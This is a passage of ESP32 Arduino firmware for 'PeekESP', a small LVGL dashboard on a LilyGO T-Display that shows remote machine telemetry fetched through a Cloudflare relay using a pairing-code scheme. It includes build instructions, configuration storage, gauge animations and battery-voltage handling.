/**
 * ============================================================================
 *  PeekESP - a physical dashboard for a remote DietPi box
 *  LilyGO TTGO T-Display (ESP32) - ST7789V 135x240 - LVGL 8.x
 * ============================================================================
 *
 *  Core 0 : WiFi -> NTP -> blocking HTTPS GET -> JSON.
 *  Core 1 : LVGL and nothing else. It reads a mutex-protected snapshot of the
 *           telemetry and drives 500 ms eased animations. Network latency on
 *           core 0 can never stall a frame on core 1.
 *
 *  Two run modes, chosen at boot:
 *    DASHBOARD - the normal display, using settings stored in NVS.
 *    SETUP     - no usable config yet, or the left button was held at boot.
 *                The device raises its own access point and serves a config
 *                page; the screen shows a QR code that joins you to it.
 *
 *  One pairing code can carry several machines - a desktop, a laptop and a
 *  Pi all running the agent with the same code. The relay returns them in one
 *  response, so the display costs one request however many it shows, and the
 *  left button swipes between them.
 *
 *  Buttons, both of which do two things depending on how long you hold:
 *    LEFT  (BOOT, GPIO0)  tap  next machine (or refresh, if there is only one)
 *                         hold setup mode
 *    RIGHT (GPIO35)       tap  backlight brightness
 *                         hold deep sleep; the same button wakes it
 *
 *  ----------------------------------------------------------------------
 *  ARDUINO IDE SETUP (do these once, or nothing will compile / display)
 *  ----------------------------------------------------------------------
 *  1. Boards Manager -> "esp32" by Espressif, install 2.0.17.
 *       Later cores are untested here; 2.0.17 is what this is verified on.
 *     Board: "LilyGo T-Display" (or "ESP32 Dev Module" - both verified)
 *     Partition Scheme: "Huge APP (3MB No OTA/1MB SPIFFS)"
 *
 *  2. Library Manager: "lvgl" (8.3.x - NOT 9.x) and "ArduinoJson".
 *     Library Manager offers lvgl 9.x first; pick 8.3.9. This sketch uses the
 *     v8 API and will not build against v9.
 *
 *  3. TFT_eSPI from LilyGO, who ship a copy already configured for this exact
 *     board - copy the TFT_eSPI folder out of
 *       https://github.com/Xinyuan-LilyGO/TTGO-T-Display
 *     into <Arduino>/libraries/. Its User_Setup_Select.h already points at
 *     Setup25_TTGO_T_Display.h, so there is nothing to edit and no way to end
 *     up with the image offset by 40 px.
 *     (Library Manager's TFT_eSPI 2.5.43 also works - both are verified - but
 *     then you must edit User_Setup_Select.h by hand: comment out
 *     "#include <User_Setup.h>" and uncomment the Setup25 line.)
 *
 *  4. LVGL config. Copy this repo's lv_conf.h to
 *       <Arduino>/libraries/lv_conf.h     (next to the lvgl folder, NOT inside it)
 *     LV_USE_SPINNER and LV_USE_QRCODE both default to 0 upstream, so the
 *     stock config link-errors on two widgets this sketch uses.
 *
 *  5. secrets.h is now OPTIONAL - it only seeds the factory defaults. Real
 *     configuration happens on-device through the setup portal. Copy
 *     secrets.example.h to secrets.h if you would rather bake yours in.
 * ============================================================================
 */

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <HTTPClient.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>
#include <time.h>
#include <math.h>
#include <esp_system.h>
#include <esp_adc_cal.h>
#include <mbedtls/sha256.h>

#include "ca_certs.h"
#include "logo_splash.h"

#include <TFT_eSPI.h>
#include <lvgl.h>
#include <ArduinoJson.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

// ============================================================================
//  FACTORY DEFAULTS
//  These are only the values a freshly-flashed device starts from. Whatever
//  you save through the setup portal lives in NVS and wins over all of them.
// ============================================================================
#if __has_include("secrets.h")
  #include "secrets.h"
#endif

#ifndef WIFI_SSID
  #define WIFI_SSID              ""
#endif
#ifndef WIFI_PASSWORD
  #define WIFI_PASSWORD          ""
#endif

#define ANIM_MS                  500   // the sweep duration the arcs/bar use
#define HTTP_TIMEOUT_MS          8000  // TLS handshakes need more than plain HTTP
#define MAX_CONSECUTIVE_FAILURES 12    // ~60 s of nothing -> reboot the stack
#define SETUP_HOLD_MS            1500  // left-button hold that forces setup mode
#define SLEEP_HOLD_MS            1200  // right-button hold that sleeps the board
#define STALE_AFTER_S            30    // relay data older than this reads as stale

// How the device reaches its telemetry. Both go through a Cloudflare Worker
// the host pushes to, so the device only ever dials OUT and needs no inbound
// port anywhere. See cloudflare/ in this repo.
//   RELAY  - a URL and read token entered by hand (a named or private stream).
#define TRANSPORT_RELAY  1
//   PAIRED - the default. The device invents a one-time code, shows it, and
//            derives its stream and read token from it. Typing that code into
//            the PeekESP app makes the app derive the same values, and the two
//            meet on the relay. No URLs, no tokens, nothing else to enter.
#define TRANSPORT_PAIRED 2

// Where a freshly flashed device looks unless told otherwise. Change this if
// you deploy your own Worker - see cloudflare/ in the repository.
#ifndef RELAY_BASE_URL
  #define RELAY_BASE_URL "https://peek-relay.peekesp.workers.dev"
#endif

// 32 characters with I, O, 0 and 1 removed - the pairs people mistype reading
// a code off a 1.14" screen. 10 characters is 2^50.
// POSIX TZ for Bangladesh: six hours ahead, and no daylight saving to
// describe. The sign is inverted in this format - "-6" means UTC+6 - which is
// the single most common way to get a POSIX TZ string exactly backwards.
#define TZ_DHAKA "<+06>-6"

#define PAIR_ALPHABET "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
#define PAIR_CODE_LEN 10

// Expected JSON (see dietpi/peek-agent.py):
//   { "host":"dietpi", "cpu_percent":12.5, "ram_percent":43.2,
//     "storage_percent":61.0, "storage_total_gb":117.9, "storage_free_gb":46.0,
//     "cpu_temp_c":48.3, "uptime_seconds":271830,
//     "net_rx_kbps":128.4, "net_tx_kbps":12.9 }
//
// The two storage_*_gb fields arrived after 1.0.0. An older agent simply omits
// them, and the display falls back to the percentage alone rather than showing
// "0 GB free" - which would read as a full disk instead of a missing field.

// ============================================================================
//  Palette + geometry
// ============================================================================
#define COL_BG        lv_color_hex(0x05070E)
#define COL_PANEL     lv_color_hex(0x0B1220)
#define COL_TRACK     lv_color_hex(0x1A2334)
#define COL_CYAN      lv_color_hex(0x00E5FF)
#define COL_MAGENTA   lv_color_hex(0xFF2E7E)
#define COL_AMBER     lv_color_hex(0xFFC145)
#define COL_GREEN     lv_color_hex(0x35F2A0)
#define COL_RED       lv_color_hex(0xFF4D6D)
#define COL_TEXT      lv_color_hex(0xE6EDF7)
#define COL_TEXT_DIM  lv_color_hex(0x5C6B82)

static const uint16_t SCREEN_W = 240;   // rotation 1 = landscape
static const uint16_t SCREEN_H = 135;

#if LV_FONT_MONTSERRAT_12
  #define F_SM  &lv_font_montserrat_12
#else
  #define F_SM  LV_FONT_DEFAULT
#endif
#if LV_FONT_MONTSERRAT_20
  #define F_BIG &lv_font_montserrat_20
#else
  #define F_BIG LV_FONT_DEFAULT
#endif
#if LV_FONT_MONTSERRAT_14
  #define F_MD  &lv_font_montserrat_14
#else
  #define F_MD  LV_FONT_DEFAULT
#endif
// The clock face. Guarded like the rest so the sketch still builds if someone
// trims lv_conf.h - it degrades to a small clock rather than failing to link.
#if LV_FONT_MONTSERRAT_44
  #define F_HUGE &lv_font_montserrat_44
#else
  #define F_HUGE F_BIG
#endif

// ============================================================================
//  TYPES
//  Every type used in a function signature must be declared here, above the
//  first function definition. The Arduino IDE generates prototypes for the
//  whole sketch and injects them immediately before that first definition, so
//  a type declared lower down produces "'X' was not declared in this scope"
//  pointing at a line that looks perfectly valid.
// ============================================================================
struct Telemetry {
  float    cpu_percent     = 0;
  float    ram_percent     = 0;
  float    storage_percent = 0;
  float    storage_total_gb = 0;      // 0 = host is older than these fields
  float    storage_free_gb  = 0;
  float    cpu_temp_c      = -1;      // <0 = host did not report one
  int8_t   battery_percent  = -1;     // <0 = that machine has no battery
  int16_t  battery_minutes  = -1;     // <0 = the OS would not estimate
  bool     battery_charging = false;
  bool     battery_ac       = false;
  float    rx_kbps         = 0;
  float    tx_kbps         = 0;
  uint32_t uptime_seconds  = 0;
  uint32_t age_s           = 0;       // relay only: seconds since the host pushed
  char     host[20]        = "dietpi";
};

// A pairing code identifies a person, not a machine, so the relay hands back a
// list and the display swipes through it. Six matches the relay's own cap: a
// smaller number here would silently drop machines that the relay is perfectly
// happy to hold.
#define MAX_DEVICES 6

struct DeviceSet {
  Telemetry d[MAX_DEVICES];
  uint8_t   n = 0;

  // The link is healthy if ANY machine is reporting. A laptop shut for the
  // night must not make the relay itself look broken - that sends someone to
  // check their network over a machine they deliberately switched off.
  uint32_t freshest_age_s() const {
    if (!n) return 0xFFFFFFFFu;
    uint32_t best = d[0].age_s;
    for (uint8_t i = 1; i < n; i++) {
      if (d[i].age_s < best) best = d[i].age_s;
    }
    return best;
  }
};

enum NetState : uint8_t {
  NET_BOOT, NET_WIFI, NET_TIME, NET_TUNNEL, NET_ONLINE, NET_STALE, NET_ERROR
};

struct Gauge {
  lv_obj_t  *arc   = nullptr;
  lv_obj_t  *value = nullptr;
  lv_color_t base  = COL_CYAN;
  int32_t    shown = 0;   // current on-screen value, 0..1000 (tenths of a %)
};

// Everything the setup portal can change. Sizes are the protocol maxima:
// an SSID is 32 bytes and a WPA2 passphrase 63.
struct Config {
  char     wifi_ssid[33]   = WIFI_SSID;
  char     wifi_pass[64]   = WIFI_PASSWORD;

  uint8_t  transport       = TRANSPORT_PAIRED;
  char     relay_url[128]  = "";      // https://<name>.workers.dev/telemetry
  char     relay_token[65] = "";      // READ_TOKEN from the Worker
  char     relay_base[96]  = RELAY_BASE_URL;   // pairing builds its URL from this
  char     pair_code[12]   = "";      // one-time code shown on screen
  bool     tls_verify      = true;    // pin the roots in ca_certs.h

  uint16_t poll_s          = 5;
  uint8_t  bl_idx          = 0;
};

// ============================================================================
//  Shared state between core 0 (network) and core 1 (UI)
// ============================================================================
static Config            cfg;
static Preferences       prefs;

static DeviceSet         g_devset;                 // guarded by g_lock

// Read by loop() so a tap knows whether there is anything to swipe to. Written
// by core 0; a torn byte would at worst cost one press.
static volatile uint8_t  g_device_count = 0;

// Buttons run on core 1 beside the UI task but must never touch LVGL, so a tap
// leaves a step here and the UI timer picks it up on its next tick.
static volatile int8_t   g_view_step = 0;

// Set once at boot from the eFuse if the chip was calibrated at the factory.
// Uncalibrated parts are out by up to 10 %, which on a battery reading is the
// difference between "20 %" and "flat".
static float             g_vref_scale = 1.0f;

// Set by the button loop, read by both tasks: the screen is off, so there is
// nothing to draw and no reason to spend requests polling for it.
static volatile bool     g_standby = false;


// Core 1 only: which machine is on screen, and the state of the swipe.
static DeviceSet         g_shown;
static uint8_t           g_view         = 0;   // page: 0..n-1 machines, n power
static uint8_t           g_dev_view     = 0;   // last machine page looked at
static uint8_t           g_view_pending = 0;
static int8_t            g_slide_dir    = 1;
static bool              g_sliding      = false;
static SemaphoreHandle_t g_lock = nullptr;

static volatile NetState g_state    = NET_BOOT;
static volatile bool     g_busy     = false;       // an HTTP GET is in flight
static volatile uint32_t g_seq      = 0;           // bumped on every good parse
static volatile uint32_t g_latency  = 0;           // ms for the last GET
static volatile bool     g_force    = false;       // button-triggered refresh
static volatile bool     g_wifi_failed = false;    // gave up joining the network
static volatile uint32_t g_reboot_at = 0;          // 0 = not scheduled

static bool     g_setup_mode = false;
static char     g_ap_ssid[24];
static char     g_ap_pass[16];
static WebServer server(80);
static DNSServer dns;

// ============================================================================
//  Display + LVGL plumbing
// ============================================================================
static TFT_eSPI tft = TFT_eSPI();

static lv_disp_draw_buf_t draw_buf;
// One 40-line partial buffer, ~19 KB. A second buffer would only pay for
// itself with a DMA flush; pushColors() below is synchronous, so LVGL would
// wait on it either way and the extra 19 KB would buy nothing.
static lv_color_t lv_buf[SCREEN_W * 40];

static const int PIN_BL      = 4;
// Both buttons do two things, chosen by how long they are held. The pairing
// screen and the footer say which, because a button whose function you have to
// remember is a button nobody presses.
//
//   LEFT  (BOOT, GPIO0)  tap  - next machine, or force a refresh if there is
//                              only one to look at
//                        hold - setup mode
//   RIGHT (GPIO35)       tap  - backlight brightness
//                        hold - deep sleep; the same button wakes it
static const int PIN_BTN_L   = 0;
static const int PIN_BTN_R   = 35;

// The T-Display brings the cell out through a 1:2 divider on GPIO34, gated by
// a MOSFET on GPIO14. Without raising ADC_EN the pin reads a floating node,
// which looks like a flat battery rather than like a divider that is switched
// off - the failure that makes people think the board has a dead cell.
static const int PIN_ADC_EN  = 14;
static const int PIN_ADC_BAT = 34;

// This board exposes no charge-status pin, so power state is inferred from the
// one thing that can be measured. A Li-ion cell off charge never sits above
// 4.2 V, so anything holding the node higher is a charger.
//
// The honest limit: a cell being topped up at 3.9 V reads exactly like one
// discharging at 3.9 V. "CHARGING" here means "something external is holding
// this up", not "current is flowing into the cell". If your board reads
// differently, this is the single number to move.
// Measured behaviour, not the datasheet ideal: on a real board the charger
// holds the node at about 4.2 V, not above it, so the original 4.32 V never
// triggered - the display simply reported a very full battery whenever the
// cable was in, which is exactly what it looked like.
//
// The cost of moving it down is stated plainly because it is real: a cell just
// off charge sits at 4.1-4.2 V for a while and will read as externally
// powered until it settles. That is the wrong answer for a few minutes; the
// old threshold was the wrong answer for as long as the cable was in.
#define VOLTS_CHARGING   4.15f

// Falling back below this counts as no longer charging. The gap between the
// two is deliberate: a single threshold makes a cell resting near it flip
// state on almost every sample.
#define VOLTS_DISCHARGE  4.02f

// Below this nothing is connected, or ADC_EN never went high. Reporting 0 %
// would be a confident wrong answer about a battery that is not there.
#define VOLTS_ABSENT     1.00f

static const int BL_CHANNEL  = 0;

static const uint8_t BL_LEVELS[] = { 255, 150, 70, 20 };
#define BL_LEVEL_COUNT (sizeof(BL_LEVELS) / sizeof(BL_LEVELS[0]))

static void backlight_init() {
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
  ledcAttach(PIN_BL, 5000, 8);
#else
  ledcSetup(BL_CHANNEL, 5000, 8);
  ledcAttachPin(PIN_BL, BL_CHANNEL);
#endif
}

static void backlight_set(uint8_t duty) {
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
  ledcWrite(PIN_BL, duty);
#else
  ledcWrite(BL_CHANNEL, duty);
#endif
}

static void disp_flush(lv_disp_drv_t *disp, const lv_area_t *area, lv_color_t *color_p) {
  const uint32_t w = area->x2 - area->x1 + 1;
  const uint32_t h = area->y2 - area->y1 + 1;

  tft.startWrite();
  tft.setAddrWindow(area->x1, area->y1, w, h);
  // lv_conf.h keeps LV_COLOR_16_SWAP at 0, so TFT_eSPI does the byte swap.
  // Written this way the sketch stays correct if you flip that setting.
  tft.pushColors((uint16_t *)&color_p->full, w * h, !LV_COLOR_16_SWAP);
  tft.endWrite();

  lv_disp_flush_ready(disp);
}

// ============================================================================
//  Configuration in NVS
//  Preferences keys are capped at 15 characters, hence the terse names.
// ============================================================================
static void config_load() {
  prefs.begin("peek", true);            // read-only
  prefs.getString("ssid",   cfg.wifi_ssid,   sizeof cfg.wifi_ssid);
  prefs.getString("pass",   cfg.wifi_pass,   sizeof cfg.wifi_pass);
  prefs.getString("rurl",   cfg.relay_url,   sizeof cfg.relay_url);
  prefs.getString("rtok",   cfg.relay_token, sizeof cfg.relay_token);
  prefs.getString("rbase",  cfg.relay_base,  sizeof cfg.relay_base);
  prefs.getString("pcode",  cfg.pair_code,   sizeof cfg.pair_code);
  cfg.transport  = prefs.getUChar("tport", cfg.transport);
  cfg.tls_verify = prefs.getBool("tlsv",   cfg.tls_verify);
  cfg.poll_s     = prefs.getUShort("poll",   cfg.poll_s);
  cfg.bl_idx     = prefs.getUChar("bl",      cfg.bl_idx);
  prefs.end();

  if (cfg.bl_idx >= BL_LEVEL_COUNT) cfg.bl_idx = 0;
  if (cfg.poll_s < 1)   cfg.poll_s = 1;      // a 0 here would busy-loop core 0
  if (cfg.poll_s > 600) cfg.poll_s = 600;
}

static void config_save() {
  prefs.begin("peek", false);
  prefs.putString("ssid",   cfg.wifi_ssid);
  prefs.putString("pass",   cfg.wifi_pass);
  prefs.putString("rurl",   cfg.relay_url);
  prefs.putString("rtok",   cfg.relay_token);
  prefs.putString("rbase",  cfg.relay_base);
  prefs.putString("pcode",  cfg.pair_code);
  prefs.putUChar ("tport",  cfg.transport);
  prefs.putBool  ("tlsv",   cfg.tls_verify);
  prefs.putUShort("poll",   cfg.poll_s);
  prefs.putUChar ("bl",     cfg.bl_idx);
  prefs.end();
}

static void config_save_backlight() {      // called from the button handler
  prefs.begin("peek", false);
  prefs.putUChar("bl", cfg.bl_idx);
  prefs.end();
}

static void config_erase() {
  prefs.begin("peek", false);
  prefs.clear();
  prefs.end();
}

// ============================================================================
//  Pairing
//
//  The device invents a code, shows it, and derives everything else from it:
//
//    stream = SHA-256("peek-stream:" + CODE)  first 16 hex
//    read   = SHA-256("peek-read:"   + CODE)  first 48 hex
//
//  The app you type the code into runs the identical derivation, so both ends
//  arrive at the same stream and token without ever sending the code anywhere.
//  The relay never learns it either - a paired stream authenticates by
//  claiming its token on first use.
//
//  Keep this byte-identical to windows/peek_pair.py and derivePairing() in
//  cloudflare/src/index.js. Vector, checked against openssl and pinned in the
//  Worker's test suite:
//
//    K7M2P4QX9R -> stream 4b907ba136d0a7f2
//                  read   ec3cb3699bd1284efb2fcfe056609e87edf4813b84e9ce84
// ============================================================================
static void sha256_prefixed_hex(const char *prefix, const char *code,
                                char *out, size_t out_size) {
  uint8_t digest[32];
  mbedtls_sha256_context ctx;
  mbedtls_sha256_init(&ctx);
  mbedtls_sha256_starts_ret(&ctx, 0);          // 0 = SHA-256, not SHA-224
  mbedtls_sha256_update_ret(&ctx, (const unsigned char *)prefix, strlen(prefix));
  mbedtls_sha256_update_ret(&ctx, (const unsigned char *)code, strlen(code));
  mbedtls_sha256_finish_ret(&ctx, digest);
  mbedtls_sha256_free(&ctx);

  // Not named HEX: Arduino's Print.h defines that as the numeric constant 16,
  // so a local array of that name expands to "static const char 16[]".
  static const char HEXD[] = "0123456789abcdef";
  size_t bytes = (out_size - 1) / 2;
  if (bytes > sizeof digest) bytes = sizeof digest;
  for (size_t i = 0; i < bytes; i++) {
    out[i * 2]     = HEXD[digest[i] >> 4];
    out[i * 2 + 1] = HEXD[digest[i] & 0x0F];
  }
  out[bytes * 2] = '\0';
}

static void pair_new_code(char *out, size_t out_size) {
  static const char AB[] = PAIR_ALPHABET;
  const size_t n = sizeof(AB) - 1;
  size_t len = out_size - 1;
  if (len > PAIR_CODE_LEN) len = PAIR_CODE_LEN;
  for (size_t i = 0; i < len; i++) {
    // esp_random() is the hardware RNG and is properly seeded once WiFi or
    // Bluetooth is up; at this point in boot it is still good enough for a
    // code that only has to be unguessable, not cryptographic.
    out[i] = AB[esp_random() % n];
  }
  out[len] = '\0';
}

// "K7M2P4QX9R" -> "K7M2-P4QX-9R", which is far easier to read off the screen
// and retype without transposing a pair.
static void pair_format(const char *code, char *out, size_t out_size) {
  size_t o = 0;
  for (size_t i = 0; code[i] && o + 2 < out_size; i++) {
    if (i && i % 4 == 0) out[o++] = '-';
    out[o++] = code[i];
  }
  out[o] = '\0';
}

// Fills relay_url and relay_token from the code. Called after the code is
// known, so the rest of the firmware just uses the relay path unchanged.
static void pair_apply(Config &c) {
  if (c.pair_code[0] == '\0') return;
  char stream[17];
  sha256_prefixed_hex("peek-stream:", c.pair_code, stream, sizeof stream);
  sha256_prefixed_hex("peek-read:", c.pair_code, c.relay_token, 49);
  snprintf(c.relay_url, sizeof c.relay_url, "%s/telemetry/%s", c.relay_base, stream);
  Serial.printf("[pair] code %s -> stream %s\n", c.pair_code, stream);
}

// A device with no SSID has nothing to connect to, so it goes to setup.
// The placeholder is treated as unset too: an older secrets.h carrying
// "YOUR_WIFI_SSID" is non-empty, and without this check the device would
// consider itself configured and never offer the setup portal at all.
static bool config_usable() {
  return cfg.wifi_ssid[0] != '\0' && strcmp(cfg.wifi_ssid, "YOUR_WIFI_SSID") != 0;
}

static void request_setup_mode() {
  prefs.begin("peek", false);
  prefs.putBool("forcecfg", true);
  prefs.end();
  g_reboot_at = millis() + 300;
}

// Remembers that these credentials have worked at least once. The difference
// matters: credentials that have NEVER worked are almost certainly wrong and
// setup is the useful answer, while credentials that worked yesterday and fail
// today mean the router is down - and dropping into an access point then would
// strand the device exactly when it should be patiently reconnecting.
static bool wifi_known_good() {
  prefs.begin("peek", true);
  const bool ok = prefs.getBool("wifiok", false);
  prefs.end();
  return ok;
}

static void mark_wifi_good() {
  if (wifi_known_good()) return;          // avoid a flash write every boot
  prefs.begin("peek", false);
  prefs.putBool("wifiok", true);
  prefs.end();
}

// Saving new settings makes the stored credentials unproven again.
static void forget_wifi_good() {
  prefs.begin("peek", false);
  prefs.putBool("wifiok", false);
  prefs.end();
}

static bool consume_setup_request() {
  prefs.begin("peek", false);
  const bool forced = prefs.getBool("forcecfg", false);
  if (forced) prefs.putBool("forcecfg", false);   // one-shot
  prefs.end();
  return forced;
}

// ============================================================================
//  Widgets   (struct Gauge is declared up in the TYPES section)
// ============================================================================
static Gauge     g_cpu, g_ram;
static lv_obj_t *g_body      = nullptr;   // everything that slides on a swipe
static lv_obj_t *g_lbl_which = nullptr;   // "2/3", hidden with a single machine
static lv_obj_t *g_bar       = nullptr;
static lv_obj_t *g_bar_value = nullptr;
static lv_obj_t *g_lbl_store = nullptr;
static int32_t   g_bar_shown = 0;
static lv_obj_t *g_dot       = nullptr;
static lv_obj_t *g_spinner   = nullptr;
static lv_obj_t *g_lbl_temp  = nullptr;
static lv_obj_t *g_lbl_net   = nullptr;
static lv_obj_t *g_lbl_ping  = nullptr;
static lv_obj_t *g_lbl_host  = nullptr;
static lv_obj_t *g_lbl_foot  = nullptr;
static lv_obj_t *g_lbl_state = nullptr;
static lv_obj_t *g_pwr_panel   = nullptr;
static lv_obj_t *g_pwr_fill    = nullptr;
static lv_obj_t *g_pwr_bolt    = nullptr;
static lv_obj_t *g_pwr_pct     = nullptr;
static lv_obj_t *g_pwr_volts   = nullptr;
static lv_obj_t *g_pwr_state   = nullptr;
static lv_obj_t *g_pwr_host    = nullptr;
static lv_obj_t *g_pair_panel   = nullptr;
static lv_obj_t *g_lbl_code     = nullptr;
static lv_obj_t *g_lbl_pair_hint = nullptr;

// ---------------------------------------------------------------------------
//  Animation: every value sweeps to its new reading instead of snapping.
//  Gauges run at 0..1000 rather than 0..100 so a 3 % change still produces
//  ~30 distinct steps over the 500 ms - no visible staircase.
// ---------------------------------------------------------------------------
static void arc_anim_cb(void *var, int32_t v) {
  Gauge *g = (Gauge *)var;
  g->shown = v;
  lv_arc_set_value(g->arc, v);
  lv_label_set_text_fmt(g->value, "%d", (int)((v + 5) / 10));
}

static void bar_anim_cb(void *var, int32_t v) {
  (void)var;
  g_bar_shown = v;
  lv_bar_set_value(g_bar, v, LV_ANIM_OFF);   // we drive the easing ourselves
  lv_label_set_text_fmt(g_bar_value, "%d%%", (int)((v + 5) / 10));
}

static void sweep(void *var, lv_anim_exec_xcb_t cb, int32_t from, int32_t to) {
  if (from == to) return;
  lv_anim_t a;
  lv_anim_init(&a);
  lv_anim_set_var(&a, var);
  lv_anim_set_exec_cb(&a, cb);
  lv_anim_set_values(&a, from, to);
  lv_anim_set_time(&a, ANIM_MS);
  lv_anim_set_path_cb(&a, lv_anim_path_ease_out);
  lv_anim_start(&a);   // replaces any in-flight anim on the same (var, cb)
}

// Load colour: the accent stays on-brand until the reading gets uncomfortable.
static lv_color_t load_color(lv_color_t base, int32_t tenths) {
  if (tenths >= 900) return COL_RED;
  if (tenths >= 750) return COL_AMBER;
  return base;
}

static int32_t to_tenths(float pct) {
  if (isnan(pct)) return 0;
  long v = lroundf(pct * 10.0f);
  if (v < 0)    v = 0;
  if (v > 1000) v = 1000;
  return (int32_t)v;
}

static void gauge_set(Gauge *g, float pct) {
  const int32_t target = to_tenths(pct);
  lv_obj_set_style_arc_color(g->arc, load_color(g->base, target), LV_PART_INDICATOR);
  sweep(g, arc_anim_cb, g->shown, target);
}

static void bar_set(float pct) {
  const int32_t target = to_tenths(pct);
  lv_obj_set_style_bg_color(g_bar, load_color(COL_CYAN, target), LV_PART_INDICATOR);
  sweep(g_bar, bar_anim_cb, g_bar_shown, target);
}

// ---------------------------------------------------------------------------
//  Status dot: a "radar ping" - the dot brightens while a ring expands out of
//  it and fades. Outline instead of a shadow, because outlines need no blur
//  pass and so cost almost nothing per frame.
// ---------------------------------------------------------------------------
static void dot_anim_cb(void *var, int32_t v) {   // v: 0..255
  lv_obj_t *o = (lv_obj_t *)var;
  lv_obj_set_style_bg_opa(o, (lv_opa_t)(90 + (v * 165) / 255), 0);
  lv_obj_set_style_outline_width(o, 1 + (v * 6) / 255, 0);
  lv_obj_set_style_outline_opa(o, (lv_opa_t)(255 - v), 0);
}

static void pulse(lv_color_t color, uint16_t period_ms) {
  lv_anim_del(g_dot, dot_anim_cb);
  lv_obj_set_style_bg_color(g_dot, color, 0);
  lv_obj_set_style_outline_color(g_dot, color, 0);

  lv_anim_t a;
  lv_anim_init(&a);
  lv_anim_set_var(&a, g_dot);
  lv_anim_set_exec_cb(&a, dot_anim_cb);
  lv_anim_set_values(&a, 0, 255);
  lv_anim_set_time(&a, period_ms);
  lv_anim_set_playback_time(&a, period_ms);
  lv_anim_set_repeat_count(&a, LV_ANIM_REPEAT_INFINITE);
  lv_anim_set_path_cb(&a, lv_anim_path_ease_in_out);
  lv_anim_start(&a);
}

static void apply_state(NetState st) {
  switch (st) {
    case NET_BOOT:   lv_label_set_text(g_lbl_state, "BOOT");      pulse(COL_TEXT_DIM, 900); break;
    case NET_WIFI:   lv_label_set_text(g_lbl_state, "WIFI...");   pulse(COL_AMBER,    450); break;
    case NET_TIME:   lv_label_set_text(g_lbl_state, "NTP SYNC");  pulse(COL_AMBER,    450); break;
    case NET_TUNNEL: lv_label_set_text(g_lbl_state, "TUNNEL..."); pulse(COL_AMBER,    450); break;
    case NET_ONLINE: lv_label_set_text(g_lbl_state, "LINK OK");   pulse(COL_GREEN,   1400); break;
    case NET_STALE:  lv_label_set_text(g_lbl_state, "STALE");     pulse(COL_AMBER,    700); break;
    case NET_ERROR:  lv_label_set_text(g_lbl_state, "NO LINK");   pulse(COL_RED,      300); break;
  }
}

// ---------------------------------------------------------------------------
//  Small formatters. LVGL's built-in printf has no float support, so anything
//  with a decimal point goes through newlib's snprintf first.
// ---------------------------------------------------------------------------
static void fmt_rate(char *out, size_t n, float kbps) {
  if (kbps >= 1000.0f) snprintf(out, n, "%.1fM", kbps / 1024.0f);
  else                 snprintf(out, n, "%.0fK", kbps);
}

// Storage crosses three orders of magnitude across the machines this runs
// against - a 4 GB DietPi card and a 12 TB array both have to fit in the same
// 150 px. Drop to one decimal only where it carries information: "1.8T" says
// something "1T" does not, "906G" and "906.4G" say the same thing.
static void fmt_capacity(char *out, size_t n, float gb) {
  if      (gb >= 1024.0f) snprintf(out, n, "%.1fT", gb / 1024.0f);
  else if (gb >= 10.0f)   snprintf(out, n, "%.0fG", gb);
  else                    snprintf(out, n, "%.1fG", gb);
}

// A Li-ion discharge curve is flat in the middle and steep at both ends, so a
// straight line from 3.0 to 4.2 V spends most of its life reading "60 %" and
// then falls off a cliff. These are the usual breakpoints, interpolated.
static uint8_t battery_percent(float v) {
  static const float VOLTS[]   = {3.00f, 3.45f, 3.68f, 3.74f, 3.77f, 3.79f,
                                  3.82f, 3.87f, 3.95f, 4.00f, 4.10f, 4.20f};
  static const uint8_t PCT[]   = {0,     5,     10,    20,    30,    40,
                                  50,    60,    70,    80,    90,    100};
  const uint8_t n = sizeof(PCT) / sizeof(PCT[0]);

  if (v <= VOLTS[0])     return 0;
  if (v >= VOLTS[n - 1]) return 100;
  for (uint8_t i = 1; i < n; i++) {
    if (v < VOLTS[i]) {
      const float span = VOLTS[i] - VOLTS[i - 1];
      const float frac = (v - VOLTS[i - 1]) / span;
      return (uint8_t)(PCT[i - 1] + frac * (PCT[i] - PCT[i - 1]) + 0.5f);
    }
  }
  return 100;
}

static float battery_volts_raw() {
  // Averaged because a single ADC sample on this chip is noisy enough to swing
  // the reading by a few percent, which on screen looks like a battery that
  // cannot make its mind up.
  uint32_t sum = 0;
  for (uint8_t i = 0; i < 16; i++) sum += analogRead(PIN_ADC_BAT);
  const float raw = sum / 16.0f;

  // 2.0 undoes the divider; 3.3 is the reference the ADC is characterised
  // against at 11 dB attenuation.
  return (raw / 4095.0f) * 2.0f * 3.3f * g_vref_scale;
}

// Averaging sixteen samples inside one read removes the noise within that
// read, and none of the noise between reads: WiFi transmit bursts pull the
// rail down for milliseconds at a time, so consecutive reads still disagree
// by enough to walk the percentage up and down while nothing is happening. An
// exponential average over reads is what stops that.
//
// Deliberately slow. Battery voltage has no business changing quickly, and a
// filter that reacts fast enough to track a transmit burst is a filter that
// shows you the transmit burst.
#define VOLT_EMA_ALPHA 0.15f

// Core 0 owns every one of these. Sixteen analogRead calls is a millisecond or
// two of blocking, and it used to happen inside the LVGL timer on core 1 -
// which is the one place on this device that must never block, because a frame
// missed there is a visible stutter in an animation. Core 0 spends most of its
// life asleep between polls, so it does the sampling and publishes the answer.
static float    g_volts_filtered = 0.0f;   // core 0 only
static bool     g_batt_charging_s = false; // core 0 only

// Published to core 1. Each is a single aligned 32-bit or byte store, so the
// worst a reader can see is the previous sample - two seconds stale, on a
// value that changes over minutes.
static volatile float   g_batt_volts    = 0.0f;
static volatile bool    g_batt_charging = false;
static volatile bool    g_batt_absent   = true;
static volatile uint8_t g_batt_pct      = 0;

// Runs on core 0. Everything the power page needs, computed once, off the
// render path.
static void battery_sample() {
  const float v = battery_volts_raw();

  if (g_volts_filtered <= 0.0f) g_volts_filtered = v;   // seed, no ramp from 0
  else g_volts_filtered += VOLT_EMA_ALPHA * (v - g_volts_filtered);

  const float volts = g_volts_filtered;

  // Hysteresis: a cell resting on a single threshold crossed it on almost
  // every sample, so the state flickered. It has to climb past VOLTS_CHARGING
  // to count as powered and fall below VOLTS_DISCHARGE to stop.
  const bool was = g_batt_charging_s;
  if      (volts >= VOLTS_CHARGING)  g_batt_charging_s = true;
